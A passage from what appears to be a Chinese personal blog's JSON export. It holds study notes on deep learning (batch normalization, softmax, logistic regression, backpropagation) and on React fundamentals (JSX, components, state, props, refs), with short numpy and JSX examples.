提示： 因为Batch归一化0超过了此层$z^{[l]}$的均值，$b^{[l]}$这个参数没有意义，必须将其去掉，因此被影响转移或偏置条件的控制参数$\\beta^{[l]}$所替代 Why does Batch Norm work?Batch归一化有效的第一个原因是，它对输入值以及隐藏单元的值起到了类似于归一化输入特征x，使其均值为0，方差为1，并且加速学习的作用 第二个原因是，它可以使权重，比网络更滞后或更深层 对于上图，我们通过左方的黑猫训练出的神经网络似乎并不怎么适合右面的有色猫，因此我们通过covariate shift — 已经训练好了x到y的映射，如果x的分布改变了，那么可能需要重新训练学习算法 covariate shift 的问题应该怎样应用于神经网络呢？ 对于这样一个神经网络，我们假设从第三个隐藏层开始观察，将前面盖住 第三隐藏层的工作是，接受前方传来的参数，并将参数通过一系列变换得到最终结果，这是我们发现，由于前方存在着w与b，实际上传来的参数值也是不断变化的，这就产生了covariate shift问题 Batch归一化做的，是它减少了，这些隐藏值分布变化的数量，绘制这些隐藏单元值的分布（以重整值z为例） 即$z^{[2]}$、$z^{[1]}$的值可以改变，batch归一化可确保，无论其怎样变化，它们的均值与方差保持不变，因此即使它们的值发生变化，至少它们的均值与方差也会是0、1， 总的来说，batch归一化减少了输入值改变的问题，使这些值变得更加稳定，神经网络之后的层就会有更加坚实的基础，略微减少了层与层之间参数的联系，增加了单个层的独立性，有助于加速整个网络的学习 Batch还有另一个作用，它有着轻微的正则化效果，即给隐藏层添加噪音，迫使后方元素不过分依赖任何一个隐藏单元（类似于dropout），不过因为添加的噪音非常小，因此不具备巨大的正则化效果 Batch Norm at Test Time在训练时，$\\mu$和$\\sigma$是在整个mini-batch上计算出来的，但在测试时，可能需要逐一处理样本，方法是根据训练集估算$\\mu$和$\\sigma$，通常我们使用指数加权平均，来追踪训练过程中看到的$\\mu$和$\\sigma$的值，还可以粗略估算$\\mu$和$\\sigma$，然后用测试中$\\mu$和$\\sigma^{2}$的值对所需的隐藏单元$z$值的调整 Softmax回归截止到本节之前，我们所用的例子都属于二分分类（只有两种可能标记：0或1），softmax回归允许在试图识别某一分类时做出预测，或者说是多种分类中的一个，而不只是识别两个分类 以下图为例 使用C来表示输入会被分入的类别的总个数（本例中为4） 针对上题，我们建立如下神经网络 最后一层分别代表了返回四种类别的概率，它们值的和为1， 对于最后一层（我们看作L），它的输入与往常一样，接下来将应用softmax激活函数，它的作用是： 首先计算一个临时变量$t\\,=\\,e^{(z^{[l]})}$ 然后$a^{[l]}\\,=\\,\\frac{e^{(z^{[l]})}}{\\sum^4{j=1}t_i}$，$a^{[l]_i\\,=\\,\\frac{t_i}{\\sum^4{j=1}t_i}}$ 下图包含实例 使用情况展示：","categories":[],"tags":[{"name":"Deep_Learning","slug":"Deep-Learning","permalink":"https://0410wzn.top/tags/Deep-Learning/"}]},{"title":"DL（一）","slug":"DL（一）","date":"2022-03-29T14:15:26.000Z","updated":"2022-04-17T08:05:17.209Z","comments":true,"path":"2022/03/29/DL（一）/","link":"","permalink":"https://0410wzn.top/2022/03/29/DL%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"Neural Networks and Deep LearningNeural Networks BasicsWhat is a Neural Network?在这里我们使用房价预测作为模型 当我们处理一组零散的房价信息并绘制房价图时，对于图上的数据，我们想到利用线性回归画出直线 但我们发现，这条直线的前方明显是负的，但很明显，房价永远都不会是负的，我们选择添加拟合函数来表示这个房价图 而这个实现功能的拟合函数，就是一个非常简单的神经网络 中间的节点，就类似于一个神经元，这样，我们的网络就实现了左边函数的功能，神经元的功能，就是接受输入的值，对其进行线性运算，取不小于0的值，最后得出预测的价格 而左边的函数在DL中非常常见，先是0，后是一条直线我们将其称为“修正线性单元”(Rectified linear unit, relu) 其中的“修正”，即使指过滤值为0的数 回到原题，大的神经网络就是由多个孤立的神经元“组合”而成的 中间的节点被叫做“隐藏单元” Supervised Learning with Neural Networks目前比较有价值的DL，都基于一种ML，我们称为“监督学习”(Supervised Learning) 对于图像，我们经常应用的是卷积神经网络(CNN) 对于序列数据，例如含有时间成分的音频，我们会根据时间将其表示为一维时间序列，我们常用的是循环神经网络(RNN) 等等 下面是几个网络的结构示意 结构化与非结构化 结构化一般是指数据库 非结构化一般是指如音频、图像、文本此类包含多种复杂信息的文件，例如图像的像素、文本中的某个单词 Binary Classification（二分分类）我们以一张图为例 对于这张图，我们想提取它的标签，如果图中有猫，就返回”1“，否则返回“0” 怎样处理数据呢？我们用”y”表示输出的结果标签 计算机在保存图片时，会将其保存为3个独立矩阵，分别对应图片的RGB三个通道 我们定义一个“特征向量” —— x，要将像素的亮度值放进特征向量中，就是把这些像素值都提取出来，放入”x“中 最终得到了一个包含RGB各个像素的很长的特征向量，而如果图片为64 64的，那么向量x的总维度即为64 64 * 3 我们用’nx’来表示输入的特征性向量的维度 回到正题，在二分分类问题中，我们的目标是训练一个分类器，它以图片的特征向量x作为输入 ，以此来预测结果 在这里我们再偏题一下，介绍一下常用的一些符号 (x, y) 表示一个单独的样本，x时nx维的特征向量，标签y为预测结果（上题中即为0或1） m 表示训练样本的数量 (x^(1), y^(1)) 表示样本1的输入和输出 强调测试数据的个数 nx * m 的矩阵X （xxx.shape()就是用来输出矩阵的维度的） Logistic Regression对于一张猫图，我们希望given一个x，获取它所对应的预测值 我们已知的Logistic回归的参数为 x —— 输入值（转置的矩阵） w —— 一个n_x维向量 b —— 实数 如何计算“y帽”？ x的线性函数？—— 但这不是一个非常好的二元分类算法，这样算出来的结果可能比1大得多，甚至可能是负值，这样是没意义的 因此，在Logistic回归中，我们将sigmoid()函数加在上面 下面是sigmoid(z)的图形 —— 一个从零到一的光滑曲线 然后是它的式子 Logistic Regression cost function为了训练Logistic回归中的参数b和w，需要定义一个cost function（成本函数） 我们想通过传入的训练集，找到参数w和b 要做到这点，我们需要记录函数的loss functioin（损失/误差函数），来衡量算法的运行情况 我们首先尝试将其值等于 但这样写的话，我们会发现之后讨论的优化问题都会变成非凸的，最后会得到多个局部最优解，梯度下降法，可能找不到全局最优值，因此我们选择使用如下函数 注意，损失函数是在单个训练样本中定义的，用来衡量单一训练样例的结果，因此最终我们将定义一个成本函数，去衡量参数w和b在全体训练样本上的表现 成本函数： 在训练模型时，我们就要找出合适的b与w，让下面的成本函数尽可能的小 Gradient Descent（梯度下降法）我们的目标：找到使其对应的成本函数为最小值的w和b 像下图一样，成本函数J就像一个“大碗”，是一个凸函数 梯度下降法所做的就是，从初始点开始，朝最陡的下坡方向走一步，并通过多次迭代到达全局最优解 为了简化思考，我们先省略b，使用一维图像来分析 为了更新w，我们将会重复进行以下操作：（:= —— 更新） $w := w - \\alpha \\frac{d J(w)}{d(w)}$ $\\alpha$表示学习率，它可以控制每一次迭代 在二维图像中，我们也是通过这个公式对w和b进行更新优化的 $w := w - \\alpha \\frac{d J(w, b)}{d(w)}$ $b := b - \\alpha \\frac{d J(w, b)}{d(b)}$ Logistic Regression Gradient descent首先来复习一下logistic回归的公式 其中，a是logistic回归的输出，y是样本的基本真值标签值 上述公式的流程图（正向传播）表示 负向传播图示： Vectorization（向量化）我们通过向量化来消除代码中的显式for循环 当我们计算$z = w^Tx + b$时（w与x都为列向量），如果我们使用非向量化手段去实现，我们需要使用for循环，而在处理大量数据时，会导致运行太慢的问题，因此我们选择使用向量化手段 在python或者numpy中，我们需要使用命令z = np.dot(w, x)，计算$w^Tx$，下面是两种写法的代码对比 1234567891011121314151617181920212223242526import numpy as npa = np.array([1, 2, 3, 4])print(a)import timea = np.random.rand(1000000)b = np.random.rand(1000000)# 记录当前时间tic = time.time()c = np.dot(a, b)toc = time.time()print(c)print(&quot;Vectorized version:&quot; + str(1000 * (toc - tic)) + &#x27;ms&#x27;)c = 0tic = time.time()for i in range(1000000): c += a[i] * b[i]toc = time.time()print(c)print(&#x27;For loop:&#x27; + str(1000 * (toc - tic)) + &#x27;ms&#x27;) 对比的运行时间如下： 当需要对很多元素进行运算时，numpy里的方法会帮助我们很轻松的完成目的 Vectorizing Logistic Regression （向量化Logistic回归）我们需要进行正向传播，如下所示 我们的目标是不通过显式的for循环，获取输出结果，而事实上，仅需一行代码，就能实现我们的目的 我们定义一个“nx * m”的矩阵， 再次定义一个“1 * m”的矩阵（行向量）[b b b … b] 而这个行向量可以表示为$w^TX + $$ \\begin{bmatrix} b&amp;b&amp;b&amp;…&amp;b\\ \\end{bmatrix} $ 以第一项为例，它可以表示为w的转置乘$x^(1^)$再加b Z就是z变量堆叠后得到的变量 为了计算$w^TX + $$ \\begin{bmatrix} b&amp;b&amp;b&amp;…&amp;b\\ \\end{bmatrix} $，numpy的指令即为= 在运算中，当我们把向量加上一个实数时，Python会自动把实数b拓展成1 * m的行向量，这即是Python中的Broadcasting（广播） Vectorizing Logistic Regression’s Gradient Computation（向量化logistic回归的梯度输出）本节的学习目标为学会同时计算m个训练数据的梯度 以下非向量化和向量化的对比 尽管我们多次强调避免for循环，但是如果希望多次迭代运行，梯度下降，我们仍然需要for循环 Broadcasting in Python我们以下题为例 Apples Beef Eggs Potatoes $ \\begin{bmatrix} 56.0&amp;0.0&amp;4.4&amp;68.0\\1.2&amp;104.0&amp;52.0&amp;8.0\\1.8&amp;135.0&amp;99.0&amp;0.9 \\end{bmatrix} $ 第一行为Carbs，第二行为Protein，第三行为Fat 我们要求各个食物的Carbs含量，即分别使用其Carbs/总量，在这里我们为了避免使用for循环计算每一列的和，我们将其视作一个3 * 4的矩阵A，使用一行Python代码对各列求和，再用第二行代码，让四列的每一列都除以对应的和 在当你运算$ \\begin{bmatrix} 1\\2\\3\\4 \\end{bmatrix}+100 $时，Python会将这个数自动展开为一个1*4向量$ \\begin{bmatrix} 100\\100\\100\\100 \\end{bmatrix} $，最终它们可以运算为$ \\begin{bmatrix} 101\\102\\103\\104 \\end{bmatrix} $这个向量，这就是广播的一种应用 再举个例子$ \\begin{bmatrix} 1&amp;2&amp;3\\4&amp;5&amp;6 \\end{bmatrix} + \\begin{bmatrix} 100&amp;200&amp;300 \\end{bmatrix} $时，Python会自动将其转化为2*3的$ \\begin{bmatrix} 100&amp;200&amp;300\\100&amp;200&amp;300 \\end{bmatrix} $矩阵 A note on python / numpy vectors 声明，确保是一个向量 Explanation of logistics regression cost function 我们将两个条件概率公式合并为下面的一个 用log来表示最小化损失函数 Shallow Neural NetworksNeural Network Overview Neural Network Representation我们从只有一个隐藏层的神经网络看起 我们来对其命名一下，将x1、x2、x3所在的层叫做“输入层”，中间一层称为“隐藏层”，右面只有一个节点的就是“输出层”，它负责输出，预测值y帽 在一个神经网络中，当使用监督学习训练它时，训练集包含了输入x以及目标输出y，“隐藏层”的指的是，在训练集中，这些中间节点的真正数值在训练集中是看不到的 在神经网络中，我们使用中括号上标来指出值是来自于哪一层 由于我们不把输入层看作一个标准层，上图所示的就是一个双层神经网络 Computing a Neural Network’s Output 这里的圆圈代表了回归计算的两个步骤，首先按照步骤求出z，然后在第二步计算激活函数（sigmoid），然后不断重复 我们来演示一下上图的部分流程 第一步，我们选取了隐函数的第一个节点，首先计算$z = w^T + b$，当然要在上面加上标 第二步，计算$a^{[1]}_1 = sigmoid(z^{[1]}_1)$ 即 ，对于z和a，按符号约定写成$a^[1^]_1$这种结构，我们现在看的是第一隐层的第一个节点，上标表示层数，下标表示当前所在的节点，所以上下标都为1 之后，我们将目标切换为第二个节点 第一步， 第二步，$a^{[1]}_2 = sigmoid(z^{[1]}_2)$ 即 第三和第四个节点同理 **整理** 而我们都知道，使用for循环对z进行运算太过低效，因此我们来考虑向量化 我们将所有w的转置堆叠起来，很明显，这是由w的转置构成的行矩阵 思路类似，我们将a的值爷堆叠起来 在其中，sigmoid函数作用于Z的四个元素也就相当于将sigmoid函数作用 到Z的每个元素 **整理** 前两个式子计算四个隐层中的Logistic回归单元，而输出层的Logistic回归则是由下面两个完成的 Explanation for vectorized implementation模拟神经网络的正向传播 Active functions在上述例子中，我们一直使用 sigmoid ($\\sigma$) 函数作为Active functions（激活函数） 但实际上，有个函数总比它表现得更好，这即是 tahn函数，或称“双曲正切函数” tanh 函数几乎在所有场合都比 sigmoid 函数优越，但输出层除外 因为如果y为0或1，我们更希望y帽的值介于0和1之间，因此在解决二元分类问题时，我们可以使用 sigmoid 函数作为输出层，所以这里注意：不同层的激活函数可以是不同的 注意两个函数都有的缺点，那就是当z非常大或者非常小时，那么导数的梯度就可能会很小 在这里我们提到“修正线性单元(Relu)”，其形状如下： 在选择激活函数时有一些经验法则，若你输出的值为0或1，sigmoid很适合作为输出层的激活函数，而其他单元都使用ReLU 现在，所谓的修正线性单元，已经成为激活函数的默认选择了 ReLU仍存在着一些缺点，即当z为负时，倒数为0 ReLU和带泄露的ReLU的好处在于，对于很多z空间，激活函数的斜率和0差的很远，因此在实践中使用，神经网络的学习速度通常会比sigmoid和tanh快（这是因为ReLU虽然有z一半的斜率为0，但在实践中，通常由足够多的隐藏单元，令z大于0，使得没有像sigmoid和tanh一样，当函数斜率接近于0时，减慢学习速度的效应，） 下面再展示一下带泄露的ReLU函数的图像 Why do you need non-linear activation function有很多层的神经网络，如果使用线性激活函数，或是没有激活函数，无论神经网络有多少层，一直在座的只是计算线性激活函数 ，如果你只是要这样计算，那还需要什么隐藏层呢？ Gradient descent for neural networks 本节会提供公式，帮助我们实现反向传播/梯度下降算法 下图的左边是正向传播，右边是反向传播 这里需要注意的是np.sum()是numpy的一个函数，用来对矩阵的一个维度求和，水平相加求和，而加上开关keepdims，就是为了防止python直接输出这些秩为1的古怪数组 g是使用的隐藏层的激活函数的导数 中间的“*”，是指逐元素乘积 实现后向传播有个技巧，即是确保矩阵的维度互相匹配 Random Initialization当训练神经网络时，随机初始化权重非常重要，对于logistic回归，可以将权重初始化为0，但如果将神经网络的各参数数组全部初始化为0，再使用梯度下降法，那会完全无效 将w和b全部初始化为0，会导致隐藏单元进行同样的计算（对称性），他们对输出单元的影响也一样大，即便经过迭代，同样的对称性却不会改变，隐藏单元依旧是对称的，因此此时无论训练神经网络多长时间，隐藏单元任然在计算完全一样的函数，使得多个隐藏单元没有意义，而我们需要让不同的隐藏单元去计算不同的函数，这个问题的解决方案就是随机初始化所有参数 下面是例子 为什么我们将其乘0.01？实际上，我们通常喜欢把权重矩阵初始化非常非常小的随机值 因为在使用sigmod或者tanh函数时 如果w过大/小，会造成z过大/小，最终落在函数的平缓部分，梯度的斜率非常小，这意味着梯度下降法会非常慢，这会让学习变得很慢 Deep Neural NetworksDeep L-layer Neural network（深层神经网络） Forward and backward propagation在神经网络中，几乎每一层都有其对应的前向和反向传播步骤，本节 我们将介绍怎样实现这个 ***前向传播 Forward propagation for layer l*** 输入 $a^{[l - 1]}$ 输出 $a^{[l]},\\,cache(z^{[l]})$（cache — 缓存） 更新前向传播的公式是：$z^{[l]}\\,=\\,w^{[l]}\\,*\\,a^{[l-1]}\\,+b^{[l]}$，$a^{[l]}\\,=\\,g^{[l]}(z^{[l]})$ 实现向量化过程：$z^{[l]}\\,=\\,w^{[l]}\\,*\\,A^{[l-1]}\\,+\\,b^{[l]}$（b是python广播），$A^{[l]}\\,=\\,g^{[l]}(z^{[l]})$ ***反向传播 Backward propagation for layer l*** 输入 $da^{[l]}$ 输出 $da^{[l-1]}$，$dW^{[l]}$，$db^{[l]}$ 计算步骤： $dz^{[l]}\\,=\\,da^{[l]}\\,\\,g^{[l]’}(z^{[l]})$，$dW^{[l]}\\,=\\,dz^{[l]}\\,a^{[l-1]}$，$db^{[l]}\\,=\\,dz^{[l]}$，$da^{[l-1]}\\,=\\,W^{[l]T}\\,*\\,dz^{[l]}$ 向量化： $dz^{[l]}\\,=\\,dA^{[l]}\\,\\,g^{[l]’}(z^{[l]})$，$dW^{[l]}\\,=\\,\\frac{1}{m}dz^{[l]}\\,\\,A^{[l-1]T}$， $db^{[l]}\\,=\\,\\frac{1}{m}np.sum(dz^{[l]},axis=1,keepdims=True)$ $dA^{[l-1]}\\,=\\,W^{[l]T}\\,*\\,dz^{[l]}$ ***Summary*** Getting your matrix dimensions right（核对矩阵维数） 首先确定$z^{[l]}$的维度为$(n^{[l]},1)$，$x$组成的的维度为$(n^{[l-1]},1)$，要使$w^{[l]}$与$x$相乘得到的矩阵与$z^{[l]}$的形状相同，$w^{[l]}$的维度必须为$(n^{[l]},n^{[l-1]})$，而$b^{[l]}$要与其相加，因此其维度应该与$z^{[l]}$相同，为$(n^{[l]},1)$，在反向传播时需要的$dw^{[l]}$与$db^{[l]}$也是一样，但是Z、A与X的维度会在向量化后发生变化，如下图所示 Why deep representations?（为什么使用深层表示）摸🐟，放截图 Building blocks of deep neural networks Parameters VS Hyperparameters（参数 VS 超参数）参数： 除了上述参数，还有其他参数，需要输入到学习算法中，比如学习率$\\alpha$、隐层数$L$、隐藏单元数$n^{[l]}$或者是激活函数$sigmooid$，这些参数需要编写者来控制，但它确实影响了最后参数$W$和$b$的值，因此它们被称为超参数","categories":[],"tags":[{"name":"Deep_Learning","slug":"Deep-Learning","permalink":"https://0410wzn.top/tags/Deep-Learning/"}]},{"title":"DL_Aim","slug":"00 DL-Aim","date":"2022-03-29T14:12:57.000Z","updated":"2022-03-29T14:20:29.537Z","comments":true,"path":"2022/03/29/00 DL-Aim/","link":"","permalink":"https://0410wzn.top/2022/03/29/00%20DL-Aim/","excerpt":"","text":"Deep Learning StudyingAimCourses in this sequence: Neural Networks and Deep Learning Improving Deep Neural Networks: Hyperparameter tuning, Regularization and Optimization Structuring（结构化） your Machine Learning project train/development/diff… Convolutional（卷积）Neural Networks (CNN) Natural Language Processing: Building sequence models RNN/LSTM","categories":[],"tags":[{"name":"Deep_Learning","slug":"Deep-Learning","permalink":"https://0410wzn.top/tags/Deep-Learning/"}]},{"title":"React（一）","slug":"React（一）","date":"2022-02-02T13:54:07.000Z","updated":"2022-04-04T12:55:08.949Z","comments":true,"path":"2022/02/02/React（一）/","link":"","permalink":"https://0410wzn.top/2022/02/02/React%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"React（一）第一章 React基础React简介What 用于构建用户界面的JS库 （操作DOM呈现页面，也即只关注界面） 将数据渲染为HTML视图的开源JS库 Why原生的缺点： 原生JS操作DOM频繁，效率低 （DOM — API操作UI）（尽管jQuery通过包装减少了代码量的书写，但在效率上没有任何提升） 使用JS直接操作DOM，浏览器会进行大量重绘重排 原生JS没有组件化编码方案，代码复用率低 模块化 —— 将JS的根据作用分成对应功能的模块 React的特点： 采用组件化模式、声明式编码，提高开发效率及组件复用率 命名式 与 声明式 在ReactNative中可以使用React语法进行移动端开发 使用虚拟DOM + 优秀的Diffing算法，尽量减少与真实DOM的交互 如下图所示，原生JS缺少代码复用，当你想改变页面中的某些元素时，结果往往是使用新的DOM将以前的完整覆盖掉，而以前的数据并没有派上用场 原生JS实现 React实现 How前置知识：判断this的指向、class、ES6语法规范、npm包管理器、原型&amp;&amp;原型链、数组常用方法、模块化 Hello React我们以实例作为引入React知识点的例子，这里我们用到三个react的js，分别是babel.min、react.development和react-dom.development， babel 在ES6中起到的作用是转码，即将ES6转换为ES5，而在react中起到的作用是将jsx转换为js（浏览器无法直接识别jsx文件） react.development是react核心库， react-dom.development是react扩展库，用来操作dom 我们写下以下代码 进入chorme调试 这里的警告，说明咱们的目前的入门写法存在一些问题，即当我们使用浏览器加载此文档时，浏览器发现了babel，就会立刻进行翻译，而如果jsx的代码繁多且复杂时，耗费的时间会非常长，这种状况不适合于大型开发中，至于开发中如何去做，会在下文中予以解决 虚拟DOM的两种创建方法 使用jsx创建虚拟DOM（同上） 使用js创建虚拟DOM 我们一般更喜欢使用jsx，因为当我们需要创建一个多层嵌套的标签时，如果使用js，我们需要在createElement中多次调用它自己，使代码变得冗长且没味，而使用jsx只需如下图所示 或者是 虚拟DOM与真实DOM关于虚拟DOM： 本质是Object类型的对象（一般对象） 虚拟DOM比较”轻“，真实DOM比较”重“，因为虚拟DOM使React内部在用，无需真实DOM上那么多属性 虚拟DOM最终会被React转化为真实DOM，呈现在页面上 jsx语法规则 全称: JavaScript XML XML早期用于存储和传输数据，后来存储和传输数据使用JSON react定义的一种类似于XML的JS扩展语法: JS + XML本质是React.createElement(component, props, …children)方法的语法糖 作用: 用来简化创建虚拟DOM ​ 写法：var ele = Hello JSX!&lt;/h1&gt; ​ 注意1：它不是字符串, 也不是HTML/XML标签 ​ 注意2：它最终产生的就是一个JS对象 标签名任意: HTML标签或其它标签 标签属性任意: HTML标签属性或其它 基本语法规则 ​ 遇到 &lt;开头的代码, 以标签的语法解析: html同名标签转换为html同名元素, 其它标签需要特别解析 ​ 遇到以 { 开头的代码，以JS语法解析: 标签中的js表达式必须用{ }包含 babel.js的作用 ​ 浏览器不能直接解析JSX代码, 需要babel转译为纯JS的代码才能运行 ​ 只要用了JSX，都要加上type=”text/babel”, 声明需要babel来处理 何为JS表达式要注意区分：【js语句(代码)】与【js表达式】 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方 以下都是表达式：（都有返回值） (1) a (2) a + b (3) demo(1) (4) arr.map() //map方法用于加工数组 (5) function test() {} 语句（代码）： 下面这些都是语句（代码）：（控制代码走向。没有值） (1) if () {} (2) for () {} (3) switch () {case: xxxx} 以下是一个遍历的代码 123456789101112131415161718&lt;script type=&quot;text/javascript&quot;&gt; const data = [&#x27;Angular&#x27;, &#x27;React&#x27;, &#x27;Vue&#x27;]//下面有一些可能出错的地方——index，我们在接下来也会j const VDOM = &#123; &lt;div&gt; &lt;h1&gt;遍历！&lt;/h1&gt; &lt;ul&gt; &#123; data.map((item, index) ==&gt; &#123; return &lt;li key = &#123;index&#125;&gt;&#123;item&#125;&lt;/li&gt; &#125;) &#125; &lt;/ul&gt; &lt;/div&gt;&#125;&lt;/script&gt; 遍历中，列表中的每一个元素都要有一个唯一值key 组件与模块＆＆模块化与组件化 模块 理解：向外提供特定功能的js程序，一般就是一个js 为什么要拆成模块：随者业务逻辑增加，代码越来越 多且复杂 作用：复用js，简化js的编写，提高js运行效率 组件 理解：用来实现局部功能效果的代码和资源的集合(html/css/js/image )等等 为什么：一个界面的功能更复杂 作用：复用编码，简化项目编码，提高运行效率 模块化 当应用的 js 都以模块来编写的,这个应用就是一个模块化的应用 组件化 当应用是以名组件的方式实现，这个应用就是一个组件化的应用 第二章 React面向组件编程函数式组件 此时，组件内部的this是undefined，其原因是，当babael翻译完代码之后，会开启严格模式，禁止自定义函数里的this指向window 执行了React.render(……)之后，发生了什么？ ​ 1.React解析组件标签，找到了MyComponent组件 ​ 2.发现组件是使用函数定义的，随后调用该函数，将返回的虚拟DOM转换为真实 ​ DOM，随后呈现在页面中 类的复习 p1.speak.call(&#123;a:1, b:2&#125;)，call有一个重要的功能，即是更改函数里的this指向，而这时由于没有a、b，this的值就是undefined super必须第一个用欧~ 总结 类中的构造器不是必须要写的，要对示例进行一些初始化操作，如添加指定属性时才写 如果A类继承了B类，且A类中写了构造器，那么A类构造器中的super是必须要调用的 类中所定义的方法，都是放在了类的原型对象上 类式组件 执行了React.render(……)之后，发生了什么？ ​ 1.React解析组件标签，找到了MyComponent组件 ​ 2.发现组件是使用类定义的，随后new出来该类实例，并通过该实例调用到原型的render方法 ​ 3.将render返回的虚拟DOM转为真实DOM，随后呈现到页面中 简单组件 &amp;&amp; 复杂组件如果组件是有状态(state)的，就是复杂组件，反之则为简单组件 那么，什么是state？ 组件实例的三大属性之一 — state 人 状态 影响 行为 组件 状态 驱动 页面 React中的事件绑定我们先来看一下原生的绑定方式 React中，三种方法都可以，推荐第三种 类中方法this的指向 要想解决此问题，可以添加如下图25行的语句 this.changWeather.bind(this)，this.changWeather找到了原型中的changeWeather函数，而bind有两个作用，一个是生成新的函数，另一个是修改this的指向，而传入的this（构造器中的this），就是Weather的实例对象 setState我们使用内置API来更改状态（state） 简写 我们自己写的函数，大部分都是作为回调函数起到交互作用，他们的this都不是指向实例函数的，当我们想引用大量回调函数时，免不了大量使用bind进行this的转移 而类中可以直接写赋值语句，其意为，向对应的实例对象中添加一个名x值x的属性（第22行） 箭头函数本身没有this，但在其中使用this并不会报错，而是会找其外层函数的this来使用（第29行） 这样，我们便无需使用构造器了 state总结1.理解： state是组件对象最重要的属性, 值是对象(可以包含多个key-value的组合) 组件被称为”状态机”, 通过更新组件的state来更新对应的页面显示(重新渲染组件) 2.注意： 组件中render方法中的this为组件实例对象 组件自定义的方法中this为undefined，如何解决？ ​ （1） 强制绑定this: 通过函数对象的bind() ​ （2）箭头函数 状态数据，不能直接修改或更新 组件实例的三大属性之一 — props当我们想从外部获取信息，而不是从内部状态中读出来的，这时我们就不能使用state了，就比如以下状态 当我们想显示上述状态时 我们需要多次渲染，这么写未免有些麻烦，React给我们提供了props属性，使用方法如下 也可以先解构赋值，减少代码的书写量 批量传递props 为什么能用{…p}的形式展开一个对象？在下一个模块我们来分析这个问题 … — 展开运算符展开运算符可以展开数组，但是不能展开一个对象 可以看到，{…p}本来是起到复制作用的，但是React和bable使其具有了展开对象的作用，需要注意的是，这种作用仅仅限于标签的传递 对props进行限制在下图中，我们可以看见两种对对象传入age的格式（第一种必须加引号，否则会构成语法错误） 当我们相对所有页面元素加一时 如果这样操作，只有第二种方式成功加一，而第一种方式的数字则只进行了字符串拼接，而如果第一种想传入数字，而非字符串，应该使用 1ReactDOM.render(&lt;Person name = &quot;秦&quot; age = &#123;18&#125; sex = &quot;男&quot; /&gt;, document.getElementById(&#x27;test1&#x27;)) 在此时，我们可以通过propTypes，向创建者 — Person，添加一些“要求”，或者说，“规则” 需要注意的是，要注意分清propTypes和PropTypes，前者可以认为是React里的一个规矩，后者是一个内置的属性 需要注意的是，在15版本之后，这个属性单独作为一个库存在，使用需引入，并且不用写React 如果要求必须加某一项，就在后面写required 1name: PropTypes.string.isRequired 同时，如果指定要求为函数时，为避免与function关键词冲突，应使用func 1speak: PropTypes.func 指定默认值如下dexxx props的简写方式props是只读的，因此我们想直接通过如this.props.name = &#39;jack&#39;，这样进行更改，是错误的！！！ 我们可以把限制塞进类里 类式组件中的构造器与props 通过上述学习我们知道，constructor完全可以用 = 和 箭头函数 替代，而当我们使用constructor时，如果不传入props，其中的this.props就没有接到对象，我们也就不能通过 实例.props 修改值了，即构造器是否接收props，是否传递给super，取决于：是否希望在构造器中通过this访问props 函数式组件与使用props对于函数function，由于没有实例，所以理论上三个实例属性(state/props/rerfs)都不能使用，但是，props可以使用，其原因在于，函数可以接收参数 1234567891011function Person (props) &#123; const &#123;name, age, sex&#125; = props return &#123; &lt;ul&gt; &lt;li&gt;姓名：&#123;name&#125;&lt;/li&gt; &lt;li&gt;性别：&#123;sex&#125;&lt;/li&gt; &lt;li&gt;年龄：&#123;age&#125;&lt;/li&gt; &lt;ul&gt; &#125;&#125; props总结理解 每个组件对象都会有props(properties的简写)属性 组件标签的所有属性都保存在props中 作用 通过标签属性从组件外向组件内传递变化的数据 注意: 组件内部不要修改props数据- 组件实例的三大属性之一 — ref字符串型的ref当我们引用标签之前，在原生JS中，往往会给对应的标签打上id，如下图所示 而在React中，我们也可以向ref中写入 可以发现，refs中被写入了类似于id的“特征”，分别代表了其对应的标签，而此时，我们也可以通过refs使用标签，同时我们也可以使用解构赋值来减少代码书写量 ref收集的不是虚拟DOM，而是其在转成真实DOM之后对应的标签 回调形式的ref上面我们通过由id到ref的方式简单介绍了ref，但很遗憾的是，因为存在的效率问题，直接使用字符串形式的ref目前已经不被官方推荐使用了，甚至在将来可能被废弃掉（官方文档明确说明了“未来版本可能移除”），因此，我们还要学习两种ref的使用方式 我们将ref改写为回调函数形式，ref=()=&gt;&#123;console.log(&#39;@&#39;)&#125;，发现回调函数确实执行了，在打印台上输出了’@’，那么，这个回调函数是否接到了参数，这个参数又是什么？ 打印一下 可以发现，它的参数正是ref所处的节点 因此我们可以这样写 当实例调用render时会触发我们写的回调函数ref，并在调用时将当前所处的节点传了进去 而(currtentNode)=&gt;&#123;this.input = currtentNode&#125;（currentNode - 当前节点），指的是，把节点放到组件实例自身上（这里的this，由于箭头函数本身没有this，而是会找其外层函数的this来使用，所以这里的this就是render的this，即组件的实例对象），给其起名为input1 当箭头函数左侧只有一个参数，小括号可以不要；右侧只有一句函数体，花括号可以不要，最终如下所示 ref={c =&gt; this.input = c} 因此在我们取用ref时，不从ref自身取，而是在其被存放的实例对象上取用，最终成品如下 回调形式ref调用次数的问题先参考官网文档 这里给一个内联函数的例子 ref={(currentNode)=&gt;{this.input1 = currentNode; console.log(‘@’, currentNode);}} 控制台输出：（注意的是，页面渲染时的那次不算跟更新） 第一次调用：@ null — 清空动作 第二次调用：@ 标签 jsx怎样注释？ {/ …… /} 那么正确的形式该怎样写呢？ 修改ref ref={this.saveInput} 同时 createRef的使用我们可以通过方法创建一个容器，并把标签“塞到”里面 由于每个容器是”专人专用“的，所以后放入的，会把前面的顶掉，所以针对不同的标签，要用不同的容器进行存取 可以看到input存储在容器中，我们要想调用它，应该这样写 alert(this.myRef.current.value) React中的事件处理（1）通过onXxx属性指定事件处理函数（注意大小写！） ​ a. React使用的是自定义（合成）事件，而非原生的DOM事件 ​ b. React中的事件是通过事件委托方式处理的（委托给组件最外层的元素） （2）通过event.target得到发生事件的DOM元素对象 （请勿过度使用ref） 受控组件与非受控组件页面中所有输入类的DOM，随着输入，就能把内容维护到状态中去。这就是受控 而“现用现取”，就是非受控 EXP 高阶函数 &amp;&amp; 函数柯里化 例子： 当我们将表单中的数据添加到state时，一个一个写未免过于麻烦，过于重复，因此可以使用如下方式 可以发现，下面的onChange调用的是saveFormData返回的对象，而为了使它正常工作，我们选择将调用函数的返回值也设置为一个函数，这样onChange最终还是调用到了函数 在这里还有个细节需要注意 这里的”dataType”，如果不加中括号，仅仅会在state中新建一个dataType，而不会获取其内容 生命周期挂载（mount）：组件放到页面 卸载（unmount）：组件被移除 引入生命周期我们以本题为例 需求： 